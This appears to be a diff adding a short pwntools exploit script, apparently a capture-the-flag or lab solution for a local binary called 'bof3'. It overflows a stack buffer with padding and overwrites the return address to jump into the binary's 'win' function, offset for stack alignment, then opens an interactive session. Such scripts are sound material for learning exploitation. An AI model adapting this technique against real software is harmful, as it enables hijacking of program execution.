@@ -1,0 +1,13 @@
+from pwn import *
+
+p = process("./bof3")
+e = ELF("./bof3")
+
+win5 = e.symbols['win'] + 5 # stack allign 
+
+payload = b'A' * 0x20 + b'B' * 0x8 + p64(win5)
+print(len(payload))
+p.sendafter("> ", payload)
+
+p.interactive()
+
